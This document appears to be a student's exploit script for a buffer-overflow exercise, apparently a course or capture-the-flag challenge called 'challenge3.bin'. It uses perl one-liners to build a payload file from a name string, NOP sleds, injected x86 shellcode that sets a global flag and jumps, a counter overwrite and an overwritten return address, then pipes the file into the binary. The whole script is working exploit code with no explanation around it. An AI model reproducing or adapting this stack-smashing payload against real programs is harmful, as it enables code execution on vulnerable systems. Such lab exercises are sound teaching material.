#write name to file
#13 charas
perl -e 'print "Rock Beom Kim";' > attack_spell3.txt

#end name string
#1 chara
perl -e 'print "\00";' >> attack_spell3.txt

#below is 88 charas total
#24 charas
perl -e 'print "\x00"x10;' >> attack_spell3.txt
perl -e 'print "\x90"x14;' >> attack_spell3.txt

#7 charas
#mov 0x0804a048, 1
perl -e 'print "\xc6\x05\x48\xa0\x04\x08\x01";' >> attack_spell3.txt

#7 charas
#8048566
#0x0804a0b4 - 0x08048566
#perl -e 'print "\xc7\x45\xe8\x66\x85\x04\x08";' >> attack_spell3.txt
perl -e 'print "\xe9\xb4\xe4\xff\xff";' >> attack_spell3.txt

#1 chara
#perl -e 'print "\xc3";' >> attack_spell3.txt

#45 charas
perl -e 'print "\x90"x48;' >> attack_spell3.txt
#perl -e 'print "\x90"x47;' >> attack_spell3.txt

#cc is 4 charas read
perl -e 'print "\xcc"x4;' >> attack_spell3.txt

#perl -e 'print "\x90"x88;' >> attack_spell3.txt
#overwrite the counter
perl -e 'print "\x66\x00\x00\x00";' >> attack_spell3.txt
perl -e 'print "\x01\x00\x00\x00";' >> attack_spell3.txt

#empty space
perl -e 'print "\x39\xc2\xf0\xb7";' >> attack_spell3.txt

#perl -e 'print "\x00"x4;' >> attack_spell3.txt
perl -e 'print "\x08\xf3\xff\xbf";' >> attack_spell3.txt
#return address
perl -e 'print "\xa6\xa0\x04\x08";' >> attack_spell3.txt

#string address
perl -e 'print "\x80\xa0\x04\x08";' >> attack_spell3.txt

perl -e 'print "\x00";' >> attack_spell3.txt

./challenge3.bin < attack_spell3.txt
